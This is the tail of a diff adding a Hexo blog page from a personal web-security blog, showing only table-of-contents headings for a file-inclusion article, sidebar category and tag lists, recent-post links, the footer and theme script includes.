href="#%E2%91%A5%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-text">⑥日志包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A6%E5%9B%BA%E5%AE%9A%E5%90%8E%E7%BC%80%E5%8C%85%E5%90%AB-include-c-%E2%80%9D-php%E2%80%9D"><span class="toc-text">⑦固定后缀包含 include($c.”.php”);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A7%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">⑧利用session.upload_progress进行文件包含</span></a></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/RCE/">RCE</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%8A%A5%E5%91%8A/">技术报告</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/PHP/" style="font-size: 0.6em;">PHP</a> <a href="/tags/RCE/" style="font-size: 0.7em;">RCE</a> <a href="/tags/SSTI/" style="font-size: 0.6em;">SSTI</a> <a href="/tags/Tomcat/" style="font-size: 0.8em;">Tomcat</a> <a href="/tags/Weblogic/" style="font-size: 0.6em;">Weblogic</a> <a href="/tags/XXE/" style="font-size: 0.6em;">XXE</a> <a href="/tags/Xpath/" style="font-size: 0.6em;">Xpath</a> <a href="/tags/mysql/" style="font-size: 0.6em;">mysql</a> <a href="/tags/python/" style="font-size: 0.6em;">python</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.7em;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.6em;">代码审计</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 0.7em;">报告</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">报错注入</a> <a href="/tags/%E9%85%8D%E7%BD%AE/" style="font-size: 0.8em;">配置</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2021/07/14/RCE%E6%80%BB%E7%BB%93/"><i class="fa  fa-book"></i> RCE总结</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/06/02/REC(%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="fa  fa-book"></i> REC(远程代码执行漏洞)原理及漏洞利用</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/05/03/Xpath%E5%9F%BA%E7%A1%80/"><i class="fa  fa-book"></i> Xpath基础</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/04/12/SSTI(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="fa  fa-book"></i> SSTI(模板注入)漏洞利用</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2021/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF%E8%AF%A6%E8%A7%A3/"><i class="fa  fa-book"></i> 代码审计思路详解</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:ciyaso@163.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Ciyaso"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 Welcome to C1yas0's Blog 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by C1yas0.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
